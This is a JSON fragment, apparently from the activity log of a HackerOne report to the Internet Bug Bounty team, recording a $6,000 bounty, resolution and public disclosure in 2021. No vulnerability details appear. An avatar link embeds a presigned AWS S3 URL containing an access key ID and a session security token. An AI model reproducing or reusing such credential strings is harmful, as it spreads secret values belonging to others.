Bounty"}},"bounty_amount":"6000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb","collaborator":{"username":"jeriko_one","url":"/jeriko_one"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12705724,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-07-27T23:26:35.964Z","updated_at":"2021-07-27T23:26:35.964Z","actor":{"username":"kunderkoffler","cleared":false,"url":"/kunderkoffler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"jeriko_one","url":"/jeriko_one"},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12705726,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-27T23:26:45.593Z","updated_at":"2021-07-27T23:26:45.593Z","first_to_agree":true,"actor":{"username":"kunderkoffler","cleared":false,"url":"/kunderkoffler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":13188429,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-08-26T23:26:46.095Z","updated_at":"2021-08-26T23:26:46.095Z","actor":{"url":"/ibb","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153209Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0324efb2fe921a8050abf968b17a949367cc3c6707694c7a83a1b9fb0256ed1e"},"profile":{"name":"Internet Bug Bounty"}},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}